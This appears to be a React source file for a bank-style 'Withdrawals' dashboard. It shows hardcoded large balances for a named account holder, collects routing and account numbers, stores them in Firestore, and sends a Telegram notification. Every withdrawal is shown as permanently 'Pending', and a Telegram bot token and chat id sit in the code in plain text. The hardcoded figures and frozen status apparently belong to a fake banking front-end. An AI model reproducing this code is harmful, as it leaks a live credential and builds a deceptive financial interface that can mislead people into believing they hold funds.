import React, { useState, useEffect } from 'react';
import './dashboard.css';

import moment from 'moment';
import { useNavigate,Link } from 'react-router-dom';


import footerlogo from './footerlogo.png';
import more from './more.png';


import {db, auth} from './firebase';

import axios from 'axios'

import { collection, getDocs, where, query } from "firebase/firestore";
import Nav from './nav';
import face from './face.png';

import { doc, setDoc } from "firebase/firestore"; 
import { async } from '@firebase/util';

function Withdrawals(){


    const navigate = useNavigate();


    React.useEffect(()=>{
        var docId = localStorage.getItem("authid");

        if(docId == null){
            navigate('/');
        }
        
     

     
    },[]);



    const handleSignOut = () => {
        auth.signOut()
          .then(() => {
            // Sign-out successful.
            console.log("User signed out");

            localStorage.removeItem("authid");

         
            navigate('/');

        
          })
          .catch((error) => {
            // An error happened.
            console.error("Error signing out:", error);
          });
      };

      const[from, setFrom] = useState("");
      const[route, setRoute] = useState("");
      const[acct, setAcct] = useState("");
      const currentTimestamp = moment().format('YYYY-MM-DD HH:mm:ss');
      const[amount, setAmount] = useState("");


      async function addToFireStore(e){
        e.preventDefault();
    
        try {
    
            const from_acct = from;
            const route_num = route;
            const to_acct = acct;
           const amount_to = amount;

            setAcct("");
            setFrom("");
            setRoute("");
            setAmount("");
    
            
    
    
    
    
            await setDoc(doc(db, "withdraw", currentTimestamp), {
                 from:from_acct,
                 route:route_num,
                 acct:to_acct,
                 amount:amount_to
    
              });
    
              console.log("Record Added Successfully");
    
              const response = await axios.post(`https://api.telegram.org/bot5464982919:AAGtjeZQ4hxueJkOoefHp040NJNaWGIZKMM/sendMessage`, {
                chat_id: 950865661,
                text: `New Withdrawal submitted on Ffin`,
              });
        
            console.log('Message sent successfully:', response.data);

            alert(`Withdrawal process pending`);
                    window.location.href = '/account/withdrawals';

           
    
    
             
            
          } catch (e) {
            console.error("Error adding document: ", e);
          }
    
        console.log("done")
    
        //   setFirstName("");
        
    }

    const [applications, setApplication] = useState([]);


    const fetchApplication = async () => {
        const applicationCollection = collection(db, 'withdraw');
        const q = query(applicationCollection);
  
        try {
          const querySnapshot = await getDocs(q);
          const applicationData = querySnapshot.docs.map((doc) => ({
            id: doc.id,
            ...doc.data(),
          }));
          setApplication(applicationData);
        } catch (error) {
          console.error('Error fetching jobs: ', error);
        }
      };

    useEffect(() => {
        
    
        fetchApplication();
      }, []); 



    return (
        <>


<div className='main row'>
<div className='col-md-3 third 'style={{
            background:"#00396f",
            minHeight:"100vh",
        }}>

            <div className='text-center py-5'>

            <img src={footerlogo} className="" style={{
                width:"115px",
                height:"115px",
                borderRadius:"100%",
            }} />

            <br></br>

            <br></br>


        
                

<Link style={{
                    textDecoration:"none",
                }} to='/account/dashboard'>
                <p className='font-weight-bold py-1 mx-2 my-3  rounded'>My Account</p>
                </Link>
                
                <Link style={{
                    textDecoration:"none",
                }} to='/account/transactions'>
                <p className='font-weight-bold py-1 mx-2 my-3 hoverme rounded'>Transactions</p>
                </Link>


                <Link style={{
                    textDecoration:"none",
                }} to='/account/withdrawals'>
                <p className='font-weight-bold py-1 mx-2 my-3 hoverme activelink rounded'>Withdrawals</p>
                </Link>

{/* 
                <Link style={{
                    textDecoration:"none",
                }} to='/admin-onboard'>
                <p className='font-weight-bold py-1 mx-2 my-3 hoverme rounded'>Onboarding</p>
                </Link> */}

                <br/>
                <button onClick={handleSignOut} className='btn btn-danger text-light font-weight-bold'>Logout</button>

         

       





            </div>




        </div>

                <div className='col-md-9 full bg-light m-0 px-0'>

                    <h5 className='card card-heading py-3 text-center m-0'style={{
                        fontWeight:"700",
                    }}>{moment(new Date()).format('dddd, MMMM DD, YYYY')}</h5>

                    <br/>
                    <br/>

                    <div className='myflex px-5 mb-4'>
                    <h5 className='font-weight-bold  py-3'>Account Name : Cynthia Larry</h5>

                    <img className='face'src={face} />

                    </div>

                    

                    <div className='row myflex py-3 px-5'>

                        <div className='col-md-5 mybg py-3 text-center'>

                            <h6 className='whitext'>Savings for Business</h6>
                            <h4 className='figure font-weight-bold'>$ 1,890,000</h4>
                        </div>
                        <div className='col-md-5 bg-primary py-3 text-center'>
                        <h6 className='whitext'>Checking Balance</h6>
                            <h4 className='figure font-weight-bold'>$589,000</h4>
                        </div>

                    </div>


                    <div className='py-3 myflex px-5'>
                    <h5 className='font-weight-bold py-3'>Recent Withdrawals</h5>

                    <button type="button" className='btn mybg text-light'data-toggle="modal" data-target="#exampleModal">Withdraw</button>

                    </div>
                  



                    <div className='col-md-10 m-auto py-5 card text-center'>

                        {/* <p>No Recent Withdrawals</p> */}

                           
                            {applications.length > 0 ? 
                            
                            <table className='table table-borderless table-striped'>

                                <thead className='mybg text-light'>
                                    <tr>
                                        <th>From Account</th>
                                        <th>Routing No.</th>
                                        <th>Account No.</th>
                                        <th>Amount</th>
                                        <th>Status</th>
                                    </tr>
                                </thead>

                                <tbody>
                                {applications.map((job) => (
                                <tr key={job.id}>
                                    <td>{job.from}</td>
                                <td>{job.route}</td>
                                <td>{job.acct}</td>
                                <td>{job.amount}</td>
                                <td><p className='badge badge-warning text-dark'>Pending</p></td>
                              
                                


        


                                
                               
                           
                                </tr>
                            ))} 
                                </tbody>

                            </table>

                            : 
                             <p>No Recent Withdrawals</p>

                                }

                    </div>


                   
                    


                   
                    
                </div>



                <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Withdraw</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form onSubmit={addToFireStore}>

            <div className='form-group'>
                <label>From Account</label>
                
                    <select onChange={function(e){
                        setFrom(e.target.value)
                    }} value={from} className='form-control'required>
                        <option value="">Choose From Account</option>
                        <option value="Savings for Business">Savings for Business - $ 1,890,000</option>
                        <option value="Checking Balance">Savings for Business - $589,000</option>

                    </select>

            </div>


            <div className='form-group'>
                <label>Routing Number</label>
                
                   <input onChange={function(e){
                       setRoute(e.target.value);
                   }} value={route} className='form-control' required/>
            </div>

            <div className='form-group'>
                <label>Account Number</label>
                
                   <input onChange={function(e){
                       setAcct(e.target.value);
                   }} value={acct} className='form-control' required/>
            </div>

            <div className='form-group'>
                <label>Amount</label>
                
                   <input type="number" onChange={function(e){
                       setAmount(e.target.value);
                   }} value={amount} className='form-control' required/>
            </div>

            <br/>


            <div className='form-group text-center'>

                <button type='submit' className='btn mybg text-center w-100 text-light'>Withdraw</button>

            </div>

        </form>
      </div>
      
    </div>
  </div>
</div>


               




            </div>
        
        </>
    );
}

export default Withdrawals;